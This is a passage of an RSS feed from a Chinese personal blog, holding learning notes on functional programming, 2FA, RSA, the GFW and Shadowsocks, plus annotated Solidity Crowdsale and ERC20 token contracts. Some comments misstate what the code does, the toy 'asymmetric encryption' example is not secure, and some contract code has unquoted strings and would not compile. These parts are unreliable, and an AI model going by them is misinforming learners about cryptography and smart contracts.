fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZm9yd2FyZHBvd2VyL2FyY2hpdmUvMjAxMC8wNS8wMS8xNzI1Nzg3Lmh0bWw=" title="https://www.cnblogs.com/forwardpower/archive/2010/05/01/1725787.html">面向对象的三个基本特征<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="FP"><a href="#FP" class="headerlink" title="FP"></a>FP</h3><p>实际上 FP<br>函数式编程, 老实说,这个刚刚接触. 个人理解呢, 是吧变量和函数这两个概念给分开, 变量是变量, 函数是函数. 那么这样的话, 我们可以分别实现,他们. 具体我们要思考的是<strong>如何对变量进行函数操作</strong></p><pre><code>var print = function(i){ console.log(i);};[1,2,3].forEach(print);</code></pre><p>这两行代码,我们很好的看出, 我们需要实现的函数本身, 和Foreach的这个操作. y=F(x);</p><blockquote><p>函数式编程强调没有”副作用”，意味着函数要保持独立，所有功能就是返回一个新的值，没有其他行为，尤其是不得修改外部变量的值。<br><span class="exturl" data-url="aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTIvMDQvZnVuY3Rpb25hbF9wcm9ncmFtbWluZy5odG1s" title="http://www.ruanyifeng.com/blog/2012/04/functional_programming.html">函数式编程初探 ruanyf<i class="fa fa-external-link"></i></span></p></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/25/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>一周干货集 (1)</title>
      <link>https://www.diglp.xyz/2018/02/21/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_1/</link>
      <guid>https://www.diglp.xyz/2018/02/21/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_1/</guid>
      <pubDate>Tue, 20 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;想说的话&quot;&gt;&lt;a href=&quot;#想说的话&quot; class=&quot;headerlink&quot; title=&quot;想说的话&quot;&gt;&lt;/a&gt;想说的话&lt;/h2&gt;&lt;p&gt;这个算得上一个系列, 对于自己平时了解到的东西,做一个简析和总结, 避免了平时到处收集,
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="想说的话"><a href="#想说的话" class="headerlink" title="想说的话"></a>想说的话</h2><p>这个算得上一个系列, 对于自己平时了解到的东西,做一个简析和总结, 避免了平时到处收集, 最后乱糟糟的景象.</p><p><code>现在是 第8周</code>, 发现自己的2018 也都快过了 <code>1/6</code> 了, 人生苦短, 时间总是比想象过的太快, 自己本来已经错过了太多太多机会, 失去了大把大把的时光, 有什么理由还继续嬉戏下去? 梦幻的青春已经结束了, 孩子.</p><blockquote><p>如果翻译器对程序进行了彻底的分析而非某种机械的变换，而且生成的中间程序与源程序之间已经没有很强的相似性，我们就认为这个语言是编译的。彻底的分析和非平凡的变换，是编译方式的标志性特征。 </p><p>如果你对知识进行了彻底的分析而非某种机械的套弄，在你脑中生成的概念与生硬的文字之间已经没有很强的相似性，我们就认为这个概念是被理解的。彻底的分析和非凡的变换，是获得真知的标志性特征。 </p><p>–摘自 <span class="exturl" data-url="aHR0cDovL2ljZTEwMDAub3Jn" title="http://ice1000.org">ice1000的博客<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="2FA-双因素认证"><a href="#2FA-双因素认证" class="headerlink" title="2FA 双因素认证"></a>2FA 双因素认证</h2><p>2FA 是(two-fact authentication)的缩写, 简单的说我们使用的离线动态密码是也(K宝)</p><p>使用认证器的时候, 有以下几个步骤</p><ul><li>会从网站上获取一个秘钥. (这样服务器和手机都会有这个串)</li><li>成功导入之后, 会有一个6位的数字, 而且是动态的</li><li>在服务器输入当前的数字,以便验证</li></ul><p>其中基本的原理, 就是这个<code>hash(pri-key, time)</code><br>服务器进行验证</p><pre><code>if(input() == hash(pri-key, time))    ...else    ...</code></pre><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuZGlnbHAueHl6LzIwMTgvMDIvMDEvMkZBLyNtb3Jl" title="http://blog.diglp.xyz/2018/02/01/2FA/#more">2FA双因素认证<i class="fa fa-external-link"></i></span></p><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>RSA 是现在极为广泛使用的加密算法, 典型的非对称加密算法. </p><p>(虽然这些内容稍稍懂得, 这里还是要加深记忆).</p><blockquote><p>举个例子, 如果现在这里有一个加密情报(cipher text),经典的思路,就是分情报和密码这两个部分,分别给目的人就好.可是我们的密码虽说是密码,可它也是明文(Clear Text).这样的密码的发送就成了大问题.如果给密码加密,那么又需要一个密码.这样无穷尽也.</p></blockquote><p>所以上面的加密情况在非可信信道上进行安全传输是不可能的,现在就开始安利非对称加密.</p><p>非对称加密能实现十分精妙的加密, 实现非可信信道上的安全通信. 实现如下</p><pre><code>key A;key B;Encrypt = F(Clear, A);Clear = F(Encrypt, B);</code></pre><p>上面的已经是十分神奇了, 值得注意的是 如果拥有了 encrypt 和 A 是无法解出 Clear 的, 这里就是非对称加密的神奇之处, 数学上称为单向陷门.<br>(hash 也是一种陷门, 不过无法保证数据完整性).</p><p>RSA 使用的是大整数分解, 具体点呢, 我们找到两个超大的质数, 把他们相乘称为一个合数, 这点很容易, 可是如果我们使用这个合数分解回这两个质数, 那么计算上基本是不可能了.这样就形成了我们神奇的非对称加密.</p><p>这里举一个有趣的 应用例子, 自己构造一个 非对称加密.</p><pre><code>2345623456 = 100001 * 23456// 我们的23456这个数据 存在于结果中了对吧? 就是后五位.100001 = 11 * 9091// 这里我们把 100001 进行质因数分解</code></pre><p>很好至此, 我们的非对称加密已经构建好了! (懵逼…) 怎么用呢? 看下面</p><pre><code>23456 * 9091 = 213238496    // 这里我们就已经对这个数据进行了加密!213238496 * 11 = 2345623456    // 这一步进行解密! 最终得到了我们需要的 明文, 神奇吧 2333</code></pre><p><span class="exturl" data-url="aHR0cDovL3d3dy5hdG9vbC5vcmcvcXVhbGl0eV9mYWN0b3IucGhw" title="http://www.atool.org/quality_factor.php">质因数分解<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cucXVpcHFpdXAuY29t" title="https://www.quipqiup.com">代换密码破解<i class="fa fa-external-link"></i></span></p><h2 id="ABOUT-GFW"><a href="#ABOUT-GFW" class="headerlink" title="ABOUT GFW"></a>ABOUT GFW</h2><p>GFW 全称是 the Great Fire Wall 的缩写.称为国家防火墙或者防火长城。其具体的作用,就不必明说了. </p><ul><li>DNS投毒 (不予解析到正确服务器)</li><li>IP限制 (对于直接IP访问的链接进行断开)</li><li>敏感词过滤 (针对HTTP 的明文数据)</li><li>报文抓取 (现在一些穿透手段, 第一步的协商报文可能被抓取)</li></ul><p>其实说到对FW的态度, 实际上我是很中立的, 没有这个政策, 可能国内的互联网,现在还暗无天日, 加之国人目前的平均水平不是很高, 所以对事实明辨分析能力不足容易导致负面影响. 所以现在的GFW对多数人来讲, 更像保护伞.对于那些追寻真想的人, 目前的各种隧道技术, 也可以基本实现目的. (虽说管控加强)</p><pre><code>function findHost(user, host){ if(Database.query(user).hasBrain())  return host; else  return &apos;114.114.114.114&apos;;}</code></pre><blockquote><p>上面也是很贴切的描述 2333. 这篇博文也是很好的说明了态度</p><p><span class="exturl" data-url="aHR0cDovL2ljZTEwMDAub3JnLzIwMTcvMDEvMjEvQWJvdXRHRlcv" title="http://ice1000.org/2017/01/21/AboutGFW/">谈谈我对 GFW 的看法<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="Socks-基本原理"><a href="#Socks-基本原理" class="headerlink" title="Socks 基本原理"></a>Socks 基本原理</h2><p>这里指代的就是我们熟知的SS. 这里要和 HTTP代理 对比一下. </p><p>HTTP代理, 顾名思义是针对于HTTP协议的代理, 这样的话, 这个东西只能工在应用层. 具体的操作, 就是把我们的HTTP请求发送到代理服务器, 之后通过代理服务器转发我们的请求, 和目标主机进行通信. 这样,我们的功能只能进行图文浏览.</p><p>SS, 这里就是使用了 Socksv5的代理方式, 本机和Local sever 之间通过Socks 协议进行访问 (port:1080). socks的特性, 他是工作在传输层的(tpc/udp), 这样意味着这种模式就有了更好的通用性. 我们的流量在 local 通过socks 代理, 之后进行<strong>加密</strong>之后与 SS remote 进行访问, 远程ss负责代理的解析, 与目标网站和主机进行访问</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuMDIxeHQuY2MvYXJjaGl2ZXMvOTg=" title="http://blog.021xt.cc/archives/98">SS原理及搭建<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmxvZy10b255dy9hcnRpY2xlcy82ODQ4Nzk2Lmh0bWw=" title="https://www.cnblogs.com/blog-tonyw/articles/6848796.html">SS基本原理<i class="fa fa-external-link"></i></span></p></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/21/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CrowdSale 合约分析</title>
      <link>https://www.diglp.xyz/2018/02/14/CrowdSale%E5%90%88%E7%BA%A6%E5%AE%9E%E7%8E%B0/</link>
      <guid>https://www.diglp.xyz/2018/02/14/CrowdSale%E5%90%88%E7%BA%A6%E5%AE%9E%E7%8E%B0/</guid>
      <pubDate>Tue, 13 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;前面的文章实现了自己创建的 Token 在以太坊网络的发布, 这一篇, 接着来, 也是涉及到了更多的东西. 这次实现一个合约,
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>前面的文章实现了自己创建的 Token 在以太坊网络的发布, 这一篇, 接着来, 也是涉及到了更多的东西. 这次实现一个合约, 实现我们可以进行自动的 Token发放.</p><h2 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h2><p>此段代码选自官方的教程, 这里凭着个人的学习和理解, 加上注释</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXRoZXJldW0ub3JnL2Nyb3dkc2FsZQ==" title="https://www.ethereum.org/crowdsale">官方代码<i class="fa fa-external-link"></i></span></p></blockquote><pre><code>pragma solidity ^0.4.16;interface token {    function transfer(address receiver, uint amount);   // 这里调用你的Token合约的函数接口}contract Crowdsale {    address public beneficiary;     // ICO的目标账户    uint public fundingGoal;        // 筹集的目标金额    uint public amountRaised;       // 当前募集的金额    uint public deadline;           // 时间限制    uint public price;              // 单token的定价    token public tokenReward;       // 这里是token的地址    mapping(address =&gt; uint256) public balanceOf;       // 地址和Token的映射关系    // 以上所有的数据都是Public的    bool fundingGoalReached = false;                    // 是否筹够    bool crowdsaleClosed = false;                       // 是否进行    event GoalReached(address recipient, uint totalAmountRaised);       // 达标事件    event FundTransfer(address backer, uint amount, bool isContribution);       // 转款事件    // 事件用于记录信息, Dapp读取事件    /**     * Constrctor function     *     * Setup the owner     */    function Crowdsale(                                 // 构造函数        address ifSuccessfulSendTo,                     // 参数表        uint fundingGoalInEthers,        uint durationInMinutes,        uint etherCostOfEachToken,        address addressOfTokenUsedAsReward    ) {        beneficiary = ifSuccessfulSendTo;        fundingGoal = fundingGoalInEthers * 1 ether;        deadline = now + durationInMinutes * 1 minutes;        price = etherCostOfEachToken * 1 ether;        tokenReward = token(addressOfTokenUsedAsReward);        // 对上面的数据变量进行赋值    }    /**     * Fallback function     *     * The function without name is the default function that is called whenever anyone sends funds to a contract     * 无名函数用于任何时候有人转钱了的回调, 这里是分配token的重点     */    function () payable {        require(!crowdsaleClosed);      // 保证Ico是没有结束        uint amount = msg.value;        balanceOf[msg.sender] += amount;            amountRaised += amount;        tokenReward.transfer(msg.sender, amount / price);   // 这里调用接口,把等价的Token分配给msg        FundTransfer(msg.sender, amount, true);             // 产生事件, 已经转Token了!    }    modifier afterDeadline() { if (now &gt;= deadline) _; }    // 修饰符, 是不是已经过了时间    /**     * Check if goal was reached     *     * Checks if the goal or time limit has been reached and ends the campaign     */    function checkGoalReached() afterDeadline {     // 注意这里的修饰符, 如果已经超时了, 直接关闭ICO,         if (amountRaised &gt;= fundingGoal){            fundingGoalReached = true;              // 判断是否筹齐, 齐了就发事件            GoalReached(beneficiary, amountRaised);        }        crowdsaleClosed = true;    }</code></pre><p>​<br>        /**</p><pre><code>     * Withdraw the funds (退钱的)     *     * Checks to see if goal or time limit has been reached, and if so, and the funding goal was reached,     * sends the entire amount to the beneficiary. If goal was not reached, each contributor can withdraw     * the amount they contributed.     * 检查时间, 和总额是否集齐, 如果达到 , 就把合约中的所有的钱款转入 受益人的账户. 如果没有达成,投钱的可以拿回自己的钱     */    function safeWithdrawal() afterDeadline {        if (!fundingGoalReached) {                  // 没达成            uint amount = balanceOf[msg.sender];    // 投资人有多少Token            balanceOf[msg.sender] = 0;              // 把他的token 清零            if (amount &gt; 0) {                                       if (msg.sender.send(amount)) {                          // 这里应该是有个发送请求(后面自己看看)                    FundTransfer(msg.sender, amount, false);                } else {                    // 保持总额不变                    balanceOf[msg.sender] = amount;                 }            }        }        if (fundingGoalReached &amp;&amp; beneficiary == msg.sender) {          // 如果已经集齐,而且是发起人调用了合约            if (beneficiary.send(amountRaised)) {                       // 这里和上面一样, 应该是Address的一个成员函数                FundTransfer(beneficiary, amountRaised, false);         // 发送 转款事件            } else {                //If we fail to send the funds to beneficiary, unlock funders balance                fundingGoalReached = false;            }        }    }}</code></pre><p>其实可见, 一个实现token 众售的合约实际上还是比较容易理解的, 主要是 token 的发放, 退钱的, 和owner 用来提钱的这几个部分组成</p><h2 id="Point"><a href="#Point" class="headerlink" title="Point"></a>Point</h2><p>这里对上面的合约出现的新的Solidity要点进行说明</p><h3 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口(interface)"></a>接口(interface)</h3><p>接口这个东西 , 其实在上一篇文章中已经有说过 , 哪里没有用到. 是个很重要的东西 , 就是实现可以在合约中调用其他合约的 external 的函数. </p><pre><code>interface token {    function transfer(address receiver, uint amount);   // 这里调用你的Token合约的函数接口}</code></pre><p>这里定义 的一个接口, 主要是是实现调用 我们Token合约中的合约发放函数.</p><p>这里有个很棒的例子: 这个是著名的以太坊的<span class="exturl" data-url="aHR0cHM6Ly9ldGhlcnNjYW4uaW8vYWRkcmVzcy8weDA2MDEyYzhjZjk3YmVhZDVkZWFlMjM3MDcwZjk1ODdmOGU3YTI2NmQjY29kZQ==" title="https://etherscan.io/address/0x06012c8cf97bead5deae237070f9587f8e7a266d#code">加密猫<i class="fa fa-external-link"></i></span>, 这个项目当时可是导致了以太坊网络的严重堵塞. 这里选取里其中一段合约代码. </p><pre><code>function getKitty(uint256 _id)    external    view    returns (    bool isGestating,    bool isReady,    uint256 cooldownIndex,    uint256 nextActionAt,    uint256 siringWithId,    uint256 birthTime,    uint256 matronId,    uint256 sireId,    uint256 generation,    uint256 genes) {    Kitty storage kit = kitties[_id];    // if this variable is 0 then it&apos;s not gestating    isGestating = (kit.siringWithId != 0);    isReady = (kit.cooldownEndBlock &lt;= block.number);    cooldownIndex = uint256(kit.cooldownIndex);    nextActionAt = uint256(kit.cooldownEndBlock);    siringWithId = uint256(kit.siringWithId);    birthTime = uint256(kit.birthTime);    matronId = uint256(kit.matronId);    sireId = uint256(kit.sireId);    generation = uint256(kit.generation);    genes = kit.genes;}</code></pre><p>由名字和返回值可见 , 这个是blahblah 一大堆,用于获取某只Kitty 的所有信息的函数. 这里如果我们的合约突然想使用一下这里的喵的DNA怎么办? 很好, 我们可以使用接口了!</p><pre><code>interface Kitty {      function getKitty(uint256 _id) external view returns (        bool isGestating,        bool isReady,        uint256 cooldownIndex,        uint256 nextActionAt,        uint256 siringWithId,        uint256 birthTime,        uint256 matronId,        uint256 sireId,        uint256 generation,        uint256 genes    );}</code></pre><p>上面我们就定义了一个对应的接口, 如何使用呢?</p><pre><code>address ckAddr = 0x06012c8cf97bead5deae237070f9587f8e7a266d;Kitty kittyInterface = Kitty(ckAddress);     // 这里实例化这个接口!// 下面就是调用了uint dna;,,,,,,,,dna = kittyInterface.getKitty(0)        // 假定是 0 号Kitty// 这里是多返回值</code></pre><p>这样我们就可以获取dna了, 使用接口, 是不是很精妙?</p><h2 id="回退函数"><a href="#回退函数" class="headerlink" title="回退函数"></a>回退函数</h2><blockquote><p>每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。</p></blockquote><p>在示例代码中, 我们使用到了回退函数,(可见只有一个修饰符, 没有函数名的)</p><pre><code>function () payable {    require(!crowdsaleClosed);      // 保证Ico是没有结束    uint amount = msg.value;    balanceOf[msg.sender] += amount;        amountRaised += amount;    tokenReward.transfer(msg.sender, amount / price);   // 这里调用接口,把等价的Token分配给msg    FundTransfer(msg.sender, amount, true);             // 产生事件, 已经转Token了!}</code></pre><p>这个也是我们ICO合约的重要函数, 实现Token的分发. 根据定义, 我们如果直接对合约地址转账, 那么默认就会调用了回退函数, 这里很巧妙的利用来转账!</p><h2 id="地址-Address"><a href="#地址-Address" class="headerlink" title="地址(Address)"></a>地址(Address)</h2><p>上面的代码有一处是没看懂</p><pre><code>if (msg.sender.send(amount)) {          // 这里应该是有个发送请求(后面自己看看)    FundTransfer(msg.sender, amount, false);} else {    // 保持总额不变    balanceOf[msg.sender] = amount; }</code></pre><p>这里感觉是一个请求, 会有返回值.于是下面就查证官方的Wiki看到</p><blockquote><p>地址类型的成员</p><p>属性：balance</p><p>函数：send()，call()，delegatecall()，callcode()。</p></blockquote><ul><li><p>地址字面量(literal)</p><p>  其实我们可以理解成一个常量, 在Solidity 里如果有字面量</p><pre><code>0x06012c8cf97bead5deae237070f9587f8e7a266d</code></pre><p>  这个会直接被编译器理解为Address类型.</p></li><li><p>balance</p><p>  这个如其定义一样 <code>myAddress.balance</code>, 这个值就是我们的当前余额</p></li><li><p>send</p><p>  这个比较重要, 之前没理解,怎么是下面这张形式</p><pre><code>beneficiary.send(amountRaised)</code></pre><p>  最后Wiki’中知道了, 这个理解顺序是 <code>this to beneficiary</code>,  就是由合约向其他的账户发送Ether.</p></li></ul><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>这次的crowdsale 结合上一次的token , 就可以发动一场轰轰烈烈的ICO了. 不过 希望能够只是以学习为目的, 尊重技术. 不要让这种没有意义的代码充斥 以太坊网络 </p><p><strong>Don’t be evil</strong></p><p>后面还会有一篇,crowdsale在测试网络上的部署. 自己记录本身, 也是学习, 和大家共勉!</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/14/CrowdSale%E5%90%88%E7%BA%A6%E5%AE%9E%E7%8E%B0/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ERC20 Token 合约代码分析</title>
      <link>https://www.diglp.xyz/2018/02/13/ERC20%20Token%20%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</link>
      <guid>https://www.diglp.xyz/2018/02/13/ERC20%20Token%20%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</guid>
      <pubDate>Mon, 12 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;合约接口代码&quot;&gt;&lt;a href=&quot;#合约接口代码&quot; class=&quot;headerlink&quot; title=&quot;合约接口代码&quot;&gt;&lt;/a&gt;合约接口代码&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;//
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="合约接口代码"><a href="#合约接口代码" class="headerlink" title="合约接口代码"></a>合约接口代码</h2><pre><code>// https://github.com/ethereum/EIPs/issues/20// 接口标准  contract ERC20 {      function totalSupply() constant returns (uint totalSupply);    // 总发行量      function balanceOf(address _owner) constant returns (uint balance);      function transfer(address _to, uint _value) returns (bool success);    // 代币分发(注意, 这个只有合约的Creator 可以调用)      function transferFrom(address _from, address _to, uint _value) returns (bool success);    // 这里是拥有者和拥有者之间的代币转移      function approve(address _spender, uint _value) returns (bool success);      function allowance(address _owner, address _spender) constant returns (uint remaining);      event Transfer(address indexed _from, address indexed _to, uint _value);      event Approval(address indexed _owner, address indexed _spender, uint _value);// Token信息     string public constant name = &quot;4FunCoin&quot;;    string public constant symbol = &quot;4FC&quot;;    uint8 public constant decimals = 18;  // token的精度, 大部分都是18}</code></pre><p>上面的代码是一个标准的ERC20标准的代码, 他给出了框架, 我们只需要实现相应的函数就好了, 这里给出函数说明:</p><h3 id="接口函数"><a href="#接口函数" class="headerlink" title="接口函数"></a>接口函数</h3><ul><li>函数的形参是局部有效, 所以前面使用下划线, 与其他的变量区别开来. 如 _owner.</li><li><code>totalSupply()</code> 函数返回这个Token的总发行量;</li><li><code>balanceOf()</code> 查询某个地址的Token数量 , 结合mapping实现</li><li><code>transfer()</code> owner 使用这个进行发送代币</li><li><code>transferFrom ()</code> token的所有者用来发送token</li><li><code>allowance()</code> 控制代币的交易，如可交易账号及资产, 控制Token的流通</li><li><code>approve()</code> 允许用户可花费的代币数；</li></ul><h3 id="事件函数"><a href="#事件函数" class="headerlink" title="事件函数"></a>事件函数</h3><p>这里两个Event是重点, 之前没弄懂, 现在倒是明白不少, 就是产生事件, 从而可以被前端代码捕获到, 从对事件使用事件服务函数进行处理 , 这里的参数,也将传递给服务函数</p><ul><li>event Transfer() Token的转账事件</li><li>event Approval() 允许事件</li></ul><h2 id="合约实现代码"><a href="#合约实现代码" class="headerlink" title="合约实现代码"></a>合约实现代码</h2><p>理解了上面的函数, 下面的代码,就实现了Token合约的函数填充</p><pre><code>pragma solidity ^0.4.16;interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }    // token的 接受者 这里声明接口, 将会在我们的ABI里contract TokenERC20 {/*********Token的属性说明************/    string public name = 4FunCoin;    string public symbol = 4FC;    uint8 public decimals = 18;  // 18 是建议的默认值    uint256 public totalSupply;    // 发行量    // 建立映射 地址对应了 uint&apos; 便是他的余额    mapping (address =&gt; uint256) public balanceOf;       // 地址对应余额    mapping (address =&gt; mapping (address =&gt; uint256)) public allowance;     // 事件，用来通知客户端Token交易发生    event Transfer(address indexed from, address indexed to, uint256 value);     // 事件，用来通知客户端代币被消耗(这里就不是转移, 是token用了就没了)    event Burn(address indexed from, uint256 value);    // 这里是构造函数, 实例创建时候执行    function TokenERC20(uint256 initialSupply, string tokenName, string tokenSymbol) public {        totalSupply = initialSupply * 10 ** uint256(decimals);    // 这里确定了总发行量        balanceOf[msg.sender] = totalSupply;    // 这里就比较重要, 这里相当于实现了, 把token 全部给合约的Creator        name = tokenName;        symbol = tokenSymbol;    }    // token的发送函数    function _transfer(address _from, address _to, uint _value) internal {        require(_to != 0x0);    // 不是零地址        require(balanceOf[_from] &gt;= _value);        // 有足够的余额来发送        require(balanceOf[_to] + _value &gt; balanceOf[_to]);    // 这里也有意思, 不能发送负数的值(hhhh)        uint previousBalances = balanceOf[_from] + balanceOf[_to];    // 这个是为了校验, 避免过程出错, 总量不变对吧?        balanceOf[_from] -= _value;    //发钱 不多说        balanceOf[_to] += _value;        Transfer(_from, _to, _value);    // 这里触发了转账的事件 , 见上event        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);    // 判断总额是否一致, 避免过程出错    }    function transfer(address _to, uint256 _value) public {        _transfer(msg.sender, _to, _value);    // 这里已经储存了 合约创建者的信息, 这个函数是只能被合约创建者使用    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {        require(_value &lt;= allowance[_from][msg.sender]);     // 这句很重要, 地址对应的合约地址(也就是token余额)        allowance[_from][msg.sender] -= _value;        _transfer(_from, _to, _value);        return true;    }    function approve(address _spender, uint256 _value) public        returns (bool success) {        allowance[msg.sender][_spender] = _value;    // 这里是可花费总量        return true;    }    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {        tokenRecipient spender = tokenRecipient(_spender);        if (approve(_spender, _value)) {            spender.receiveApproval(msg.sender, _value, this, _extraData);            return true;        }    }    // 正如其名, 这个是烧币(SB)的.. ,用于把创建者的 token 烧掉    function burn(uint256 _value) public returns (bool success) {        require(balanceOf[msg.sender] &gt;= _value);    // 必须要有这么多        balanceOf[msg.sender] -= _value;        totalSupply -= _value;        Burn(msg.sender, _value);        return true;    }    // 这个是用户销毁token.....    function burnFrom(address _from, uint256 _value) public returns (bool success) {        require(balanceOf[_from] &gt;= _value);        // 一样要有这么多        require(_value &lt;= allowance[_from][msg.sender]);    //         balanceOf[_from] -= _value;        allowance[_from][msg.sender] -= _value;        totalSupply -= _value;        Burn(_from, _value);        return true;    }}</code></pre><p>上面的代码阅读难度不大, 也写了大多处的注释, 这里吧自己学的几个Point 提一下</p><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><pre><code>// 这里是构造函数, 实例创建时候执行function TokenERC20(uint256 initialSupply, string tokenName, string tokenSymbol) public {    totalSupply = initialSupply * 10 ** uint256(decimals);    // 这里确定了总发行量        balanceOf[msg.sender] = totalSupply;    // 这里就比较重要, 这里相当于实现了, 把token 全部给合约的Creator        name = tokenName;        symbol = tokenSymbol;    }</code></pre><p>在Solidity里面, Contract 我们可以直接理解成一个Class吧. 如C++ 一样, 这里面也存在一个<br>构造函数而且他们的功能也是近乎相同, 在合约创建的时候执行一次.(没错 , 合约整个生命周期里只能执行这样一次) , 所以他的作用就是实现合约信息的初始化, 一旦数据写入区块数据, 将是无法更改的了(永固性).</p><p>构造函数的是不能有返回值的(有也无法接受), 但是可以带参数, 像是此处代码, 把发行量, token的名称和token的 符号作为参数留出. 在合约初始化时候我们便可以自行定义.</p><p>函数体中可见, 我们对货币总量, 名称和 符号进行赋值, 这样,这些值就永远的记录在了我们的合约的区块数据中了</p><h3 id="映射-mapping"><a href="#映射-mapping" class="headerlink" title="映射(mapping)"></a>映射(mapping)</h3><pre><code>// 建立映射 地址对应了 uint&apos; 便是他的余额mapping (address =&gt; uint256) public balanceOf;   // 地址对应余额mapping (address =&gt; mapping (address =&gt; uint256)) public allowance;</code></pre><p>这个形式,乍一眼看上去是没那么好懂. 其实慢慢的 也是理解了, 这里的映射, 通俗的讲,就是相当于我们的字典, 是一个键值对. 上述的代码也是建立了一个 address 到 uint类型的映射关系. </p><pre><code>balanceOf[msg.sender] = 10000;    //msg.sender 是一个地址</code></pre><p>这样简单的方法, 相当于对账户进行余额的赋值;</p><h3 id="事件-event"><a href="#事件-event" class="headerlink" title="事件(event)"></a>事件(event)</h3><p>Solidity 是基于事件驱动(前面有说不是消息驱动), 事件也是连接前端的桥梁, 一个事件的触发, 可以被前端所捕获, 从而做出相应的响应.比如MeteMask的支付窗口一样. 点了支付 ,他就弹出来了对吧.</p><pre><code>// 事件，用来通知客户端Token交易发生event Transfer(address indexed from, address indexed to, uint256 value);// 下面是事件监听var ClientReceipt = web3.eth.contract(abi);    //导入接口说明var clientReceipt = ClientReceipt.at(0x123 /* address */);    //合约地址// 对事件进行监听, var event = clientReceipt.Deposit(function(error, result) {    if (!error)        console.log(result);});// 对事件进行绑定     bindEvents: function() {    $(document).on(&apos;click&apos;, &apos;.btn-adopt&apos;, App.handleAdopt);  },</code></pre><p>EG:</p><blockquote><p>事件 是合约和区块链通讯的一种机制。你的前端应用“监听”某些事件，并做出反应。</p></blockquote><pre><code>// in contract// 这里建立事件event IntegersAdded(uint x, uint y, uint result);function add(uint _x, uint _y) public {  uint result = _x + _y;  //触发事件，通知app  IntegersAdded(_x, _y, result);  return result;}//in js// 你的 app 前端可以监听这个事件。JavaScript 实现如下:YourContract.IntegersAdded(function(error, result) {   // do something}</code></pre><h3 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口(interface)"></a>接口(interface)</h3><p>这个合约的第二行就是, 差点忘了… 这个也是一个相对重要的东西, 合约主要的作用个人理解来说就是实现与其他合约的交互.</p><p>如果我们的合约需要和区块链上的其他的合约交互(比如使用其中的公有函数)，则需先定义一个 interface (接口)。</p><p>先举一个简单的例子子。 假设在区块链上有这么一个合约：</p><pre><code>contract LuckyNumber {  mapping(address =&gt; uint) numbers;  function setNum(uint _num) public {    numbers[msg.sender] = _num;  }  function getNum(address _myAddress) public view returns (uint) {    return numbers[_myAddress];  }}</code></pre><p>这是个很简单的合约，您可以用它存储自己的幸运号码，并将其与地址关联。 这样其他人就可以通过地址得到号码了。</p><p>现在假设我们有一个外部合约，使用 getNum 函数可读取其中的数据。</p><p>首先，我们定义 LuckyNumber 合约的 interface ：</p><pre><code>interface NumberInterface {  function getNum(address _myAddress) public view returns (uint);}</code></pre><p>首先，我们只用声明进行交互的函数 —— 在本例中为 getNum.(声明, 函数体是空的)</p><p>然后我们在我们自己的合约中直接对接口进行访问, 就可以getnum 了.</p><p>Ethereum 内部有一个散列函数keccak256，它用了SHA3版本。一个散列函数基本上就是把一个字符串转换为一个256位的16进制数字。字符串的一个微小变化会引起散列数据极大变化。</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>这次的分析也是基于上一篇的 Token发布的文章的进一步, 通过自己读读代码,总结一下里面的point, 借此也是学习力Solidity. </p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/13/ERC20%20Token%20%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#disqus_thread</comments>
